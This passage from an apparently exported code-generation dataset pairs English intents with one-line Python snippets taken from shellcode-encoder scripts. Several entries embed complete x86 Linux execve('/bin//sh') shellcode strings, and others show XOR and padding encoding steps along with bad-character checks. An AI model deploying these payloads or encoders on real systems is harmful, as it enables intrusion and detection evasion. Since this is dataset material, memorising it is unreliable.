      "value",
      "of",
      "leader",
      "to",
      "hexadecimal",
      ",",
      "then",
      "slice",
      "it",
      "at",
      "index",
      "3",
      ",",
      "convert",
      "it",
      "to",
      "var0",
      "and",
      "set",
      "its",
      "value",
      "to",
      "variable",
      "sb"
    ],
    "snippet_tokens": [
      "sb",
      "=",
      "int",
      "(",
      "hex",
      "(",
      "leader",
      ")",
      "[",
      "3",
      ":",
      "]",
      ",",
      "16",
      ")"
    ]
  },
  {
    "intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"",
    "rewritten_intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "as",
      "tuple",
      "and",
      "add",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "as",
      "tuple",
      "and",
      "add",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "shellcode is a tuple containing the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "shellcode is a tuple containing the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "tuple",
      "containing",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "Declare a tuple called shellcode and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" into it",
    "rewritten_intent": "Declare a tuple called shellcode and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" into it",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "Declare",
      "tuple",
      "called",
      "var0",
      "and",
      "add",
      "string",
      "var1",
      "into",
      "it"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "declare the tuple shellcode containing the string \"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "declare the tuple shellcode containing the string \"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "declare",
      "tuple",
      "var0",
      "containing",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "Declare a tuple shellcode and add the string \"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\" into it",
    "rewritten_intent": "Declare a tuple shellcode and add the string \"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\" into it",
    "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\"": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "Declare",
      "tuple",
      "var0",
      "and",
      "add",
      "string",
      "var1",
      "into",
      "it"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "store in the variable shellcode b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "store in the variable shellcode b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "shellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"": "var2",
      "shellcode": "var0",
      "b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80": "var1"
    },
    "intent_tokens": [
      "store",
      "in",
      "variable",
      "var0",
      "bvar2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "bvar2"
    ]
  },
  {
    "intent": "remove the first 2 items from shellcode",
    "rewritten_intent": "remove the first 2 items from shellcode",
    "snippet": "shellcode = shellcode[2::]",
    "slot_map": {
      "shellcode": "var0"
    },
    "intent_tokens": [
      "remove",
      "first",
      "2",
      "items",
      "from",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var0",
      "[",
      "2",
      ":",
      "]"
    ]
  },
  {
    "intent": "shellcode is the first argument after removing string '\\\\x' decoded in hexadecimal",
    "rewritten_intent": "shellcode is the first argument after removing string '\\\\x' decoded in hexadecimal",
    "snippet": "shellcode = sys.argv[1].replace('\\\\x', '').decode('hex')",
    "slot_map": {
      "'\\\\x'": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "first",
      "argument",
      "after",
      "removing",
      "string",
      "var1",
      "decoded",
      "in",
      "hexadecimal"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "sys.argv",
      "[",
      "1",
      "]",
      ".replace",
      "(",
      "``",
      "\\\\x",
      "''",
      ",",
      "``",
      "''",
      ")",
      ".decode",
      "(",
      "``",
      "hex",
      "''",
      ")"
    ]
  },
  {
    "intent": "Declare a tuple shellcode and add the string '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' into it",
    "rewritten_intent": "Declare a tuple shellcode and add the string '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' into it",
    "snippet": "shellcode =('\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80')",
    "slot_map": {
      "'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'": "var1",
      "shellcode": "var0"
    },
    "intent_tokens": [
      "Declare",
      "tuple",
      "var0",
      "and",
      "add",
      "string",
      "var1",
      "into",
      "it"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "(",
      "``",
      "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
      "''",
      ")"
    ]
  },
  {
    "intent": "shellcode_encoded is an empty bitearray",
    "rewritten_intent": "shellcode_encoded is an empty bitearray",
    "snippet": "shellcode_encoded = bytearray()",
    "slot_map": {
      "shellcode_encoded": "var0",
      "bitearray": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "empty",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "bytearray",
      "(",
      ")"
    ]
  },
  {
    "intent": "store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\\\x'",
    "rewritten_intent": "store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\\\x'",
    "snippet": "shellcode_encoded_hex = ''.join('\\\\x{:02x}'.format(x) for x in shellcode_encoded)",
    "slot_map": {
      "'\\\\x'": "var4",
      "shellcode_encoded_hex": "var0",
      "shellcode_encoded": "var1"
    },
    "intent_tokens": [
      "store",
      "in",
      "variable",
      "var0",
      "hexadecimal",
      "values",
      "of",
      "var1",
      "separated",
      "by",
      "string",
      "var4"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``",
      "''",
      ".join",
      "(",
      "``",
      "\\\\x",
      "{",
      ":02x",
      "}",
      "''",
      ".format",
      "(",
      "x",
      ")",
      "for",
      "x",
      "in",
      "var1",
      ")"
    ]
  },
  {
    "intent": "store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','",
    "rewritten_intent": "store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','",
    "snippet": "shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shellcode_encoded).rstrip(',')",
    "slot_map": {
      "'0x'": "var4",
      "','": "var5",
      "shellcode_encoded_nasm": "var0",
      "shellcode_encoded": "var1"
    },
    "intent_tokens": [
      "store",
      "in",
      "variable",
      "var0",
      "hexadecimal",
      "values",
      "of",
      "var1",
      "separated",
      "by",
      "string",
      "var4",
      "and",
      "remove",
      "any",
      "trailing",
      "var5"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``",
      ".join",
      "(",
      "'0x",
      "{",
      ":02x",
      "}",
      ",",
      "'.format",
      "(",
      "x",
      ")",
      "for",
      "x",
      "in",
      "var1",
      ")",
      ".rstrip",
      "(",
      "var5",
      ")"
    ]
  },
  {
    "intent": "append the value 0x90 to shellcode_encoded",
    "rewritten_intent": "append the value 0x90 to shellcode_encoded",
    "snippet": "shellcode_encoded.append(0x90)",
    "slot_map": {
      "shellcode_encoded": "var1",
      "0x90": "var0"
    },
    "intent_tokens": [
      "append",
      "value",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1.append",
      "(",
      "var0",
      ")"
    ]
  },
  {
    "intent": "append the value 0xaa to shellcode_encoded",
    "rewritten_intent": "append the value 0xaa to shellcode_encoded",
    "snippet": "shellcode_encoded.append(0xaa)",
    "slot_map": {
      "shellcode_encoded": "var0"
    },
    "intent_tokens": [
      "append",
      "value",
      "0xaa",
      "to",
      "var0"
    ],
    "snippet_tokens": [
      "var0.append",
      "(",
      "170",
      ")"
    ]
  },
  {
    "intent": "append the value of the variable r to shellcode_encoded",
    "rewritten_intent": "append the value of the variable r to shellcode_encoded",
    "snippet": "shellcode_encoded.append(r)",
    "slot_map": {
      "shellcode_encoded": "var0"
    },
    "intent_tokens": [
      "append",
      "value",
      "of",
      "variable",
      "r",
      "to",
      "var0"
    ],
    "snippet_tokens": [
      "var0.append",
      "(",
      "r",
      ")"
    ]
  },
  {
    "intent": "compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded",
    "rewritten_intent": "compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded",
    "snippet": "shellcode_encoded.append(shellcode_original[i] ^ r)",
    "slot_map": {
      "shellcode_original": "var0",
      "shellcode_encoded": "var2",
      "bitwise": "var1"
    },
    "intent_tokens": [
      "compute",
      "value",
      "of",
      "var0",
      "at",
      "index",
      "i",
      "var1",
      "xor",
      "r",
      "then",
      "append",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "var2.append",
      "(",
      "var0",
      "[",
      "i",
      "]",
      "^",
      "r",
      ")"
    ]
  },
  {
    "intent": "compute the value of shellcode_original at index i+1 bitwise xor r then append to shellcode_encoded",
    "rewritten_intent": "compute the value of shellcode_original at index i+1 bitwise xor r then append to shellcode_encoded",
    "snippet": "shellcode_encoded.append(shellcode_original[i+1] ^ r)",
    "slot_map": {
      "shellcode_original": "var0",
      "shellcode_encoded": "var3",
      "i+1": "var1",
      "bitwise": "var2"
    },
    "intent_tokens": [
      "compute",
      "value",
      "of",
      "var0",
      "at",
      "index",
      "var1",
      "var2",
      "xor",
      "r",
      "then",
      "append",
      "to",
      "var3"
    ],
    "snippet_tokens": [
      "var3.append",
      "(",
      "var0",
      "[",
      "var1",
      "]",
      "^",
      "r",
      ")"
    ]
  },
  {
    "intent": "compute the value of shellcode_original at index i+2 bitwise xor r then append to shellcode_encoded",
    "rewritten_intent": "compute the value of shellcode_original at index i+2 bitwise xor r then append to shellcode_encoded",
    "snippet": "shellcode_encoded.append(shellcode_original[i+2] ^ r)",
    "slot_map": {
      "shellcode_original": "var0",
      "shellcode_encoded": "var3",
      "i+2": "var1",
      "bitwise": "var2"
    },
    "intent_tokens": [
      "compute",
      "value",
      "of",
      "var0",
      "at",
      "index",
      "var1",
      "var2",
      "xor",
      "r",
      "then",
      "append",
      "to",
      "var3"
    ],
    "snippet_tokens": [
      "var3.append",
      "(",
      "var0",
      "[",
      "var1",
      "]",
      "^",
      "r",
      ")"
    ]
  },
  {
    "intent": "compute the value of shellcode_original at index i+3 bitwise xor r then append to shellcode_encoded",
    "rewritten_intent": "compute the value of shellcode_original at index i+3 bitwise xor r then append to shellcode_encoded",
    "snippet": "shellcode_encoded.append(shellcode_original[i+3] ^ r)",
    "slot_map": {
      "shellcode_original": "var0",
      "shellcode_encoded": "var2",
      "bitwise": "var1"
    },
    "intent_tokens": [
      "compute",
      "value",
      "of",
      "var0",
      "at",
      "index",
      "i+3",
      "var1",
      "xor",
      "r",
      "then",
      "append",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "var2.append",
      "(",
      "var0",
      "[",
      "i",
      "+",
      "3",
      "]",
      "^",
      "r",
      ")"
    ]
  },
  {
    "intent": "set the variable shellcode_file to the first command-line argument",
    "rewritten_intent": "set the variable shellcode_file to the first command-line argument",
    "snippet": "shellcode_file = sys.argv[1]",
    "slot_map": {
      "shellcode_file": "var0"
    },
    "intent_tokens": [
      "set",
      "variable",
      "var0",
      "to",
      "first",
      "command-line",
      "argument"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "sys.argv",
      "[",
      "1",
      "]"
    ]
  },
  {
    "intent": "save the length of execve_shellcode into shellcode_len",
    "rewritten_intent": "save the length of execve_shellcode into shellcode_len",
    "snippet": "shellcode_len=len(execve_shellcode)",
    "slot_map": {
      "execve_shellcode": "var0",
      "shellcode_len": "var1"
    },
    "intent_tokens": [
      "save",
      "length",
      "of",
      "var0",
      "into",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "=",
      "len",
      "(",
      "var0",
      ")"
    ]
  },
  {
    "intent": "read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\\\x' with ''\" and store the result in shellcode_original",
    "rewritten_intent": "read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\\\x' with ''\" and store the result in shellcode_original",
    "snippet": "shellcode_original = bytearray.fromhex(f.read().strip().replace('\\\\x',''))",
    "slot_map": {
      "'\\\\x'": "var3",
      "''": "var4",
      "shellcode_original": "var5",
      "bytearray": "var0",
      "whitespaces": "var1",
      "occurences": "var2"
    },
    "intent_tokens": [
      "read",
      "file",
      "f",
      "as",
      "var0",
      "from",
      "hexadecimal",
      "values",
      "remove",
      "var1",
      "and",
      "replace",
      "all",
      "var2",
      "of",
      "string",
      "var3",
      "with",
      "var4",
      "''",
      "and",
      "store",
      "result",
      "in",
      "var5"
    ],
    "snippet_tokens": [
      "var5",
      "=",
      "var0.fromhex",
      "(",
      "f.read",
      "(",
      ")",
      ".strip",
      "(",
      ")",
      ".replace",
      "(",
      "``",
      "\\\\x",
      "''",
      ",",
      "''",
      "''",
      ")",
      ")"
    ]
  },
  {
    "intent": "store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\\\x'",
    "rewritten_intent": "store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\\\x'",
    "snippet": "shellcode_original_hex = ''.join('\\\\x{:02x}'.format(x) for x in shellcode_original)",
    "slot_map": {
      "'\\\\x'": "var4",
      "shellcode_original_hex": "var0",
      "shellcode_original": "var1"
    },
    "intent_tokens": [
      "store",
      "in",
      "variable",
      "var0",
      "hexadecimal",
      "values",
      "of",
      "var1",
      "separated",
      "by",
      "string",
      "var4"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``",
      "''",
      ".join",
      "(",
      "``",
      "\\\\x",
      "{",
      ":02x",
      "}",
      "''",
      ".format",
      "(",
      "x",
      ")",
      "for",
      "x",
      "in",
      "var1",
      ")"
    ]
  },
  {
    "intent": "append 0x90 to the shellcode_original variable",
    "rewritten_intent": "append 0x90 to the shellcode_original variable",
    "snippet": "shellcode_original.append(0x90)",
    "slot_map": {
      "shellcode_original": "var1",
      "0x90": "var0"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "var1",
      "variable"
    ],
    "snippet_tokens": [
      "var1.append",
      "(",
      "var0",
      ")"
    ]
  },
  {
    "intent": "shift is the first element of sys.argv converted to integer",
    "rewritten_intent": "shift is the first element of sys.argv converted to integer",
    "snippet": "shift = int(sys.argv[1])",
    "slot_map": {
      "sys.argv": "var0"
    },
    "intent_tokens": [
      "shift",
      "is",
      "first",
      "element",
      "of",
      "var0",
      "converted",
      "to",
      "integer"
    ],
    "snippet_tokens": [
      "shift",
      "=",
      "int",
      "(",
      "sys.argv",
      "[",
      "1",
      "]",
      ")"
    ]
  },
  {
    "intent": "string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub",
    "rewritten_intent": "string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub",
    "snippet": "string1 = decoder_stub.join(encoded)",
    "slot_map": {
      "decoder_stub": "var1",
      "string1": "var0"
    },
    "intent_tokens": [
      "var0",
      "contains",
      "string",
      "concatenated",
      "with",
      "elements",
      "of",
      "encoded",
      "separated",
      "by",
      "value",
      "of",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1.join",
      "(",
      "encoded",
      ")"
    ]
  },
  {
    "intent": "stub_has_bad_char is boolean False",
    "rewritten_intent": "stub_has_bad_char is boolean False",
    "snippet": "stub_has_bad_char = False",
    "slot_map": {
      "False": "var1",
      "stub_has_bad_char": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "boolean",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "stub_has_bad_char is boolean True",
    "rewritten_intent": "stub_has_bad_char is boolean True",
    "snippet": "stub_has_bad_char = True",
    "slot_map": {
      "True": "var1",
      "stub_has_bad_char": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "boolean",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "subtract sb from fb and store the result in the variable subfs",
    "rewritten_intent": "subtract sb from fb and store the result in the variable subfs",
    "snippet": "subfs = fb-sb",
    "slot_map": {
      "fb": "var0",
      "subfs": "var1"
    },
    "intent_tokens": [
      "subtract",
      "sb",
      "from",
      "var0",
      "and",
      "store",
      "result",
      "in",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "=",
      "var0",
      "-",
      "sb"
    ]
  },
  {
    "intent": "subtract Dec_hopecode from 255 and store the result in variable suplX",
    "rewritten_intent": "subtract Dec_hopecode from 255 and store the result in variable suplX",
    "snippet": "suplX = 255 - Dec_hopcode",
    "slot_map": {
      "Dec_hopecode": "var0",
      "suplX": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "from",
      "255",
      "and",
      "store",
      "result",
      "in",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "=",
      "255",
      "-",
      "Dec_hopcode"
    ]
  },
  {
    "intent": "swapped is an empty list",
    "rewritten_intent": "swapped is an empty list",
    "snippet": "swapped = []",
    "slot_map": {},
    "intent_tokens": [
      "swapped",
      "is",
      "empty",
      "list"
    ],
    "snippet_tokens": [
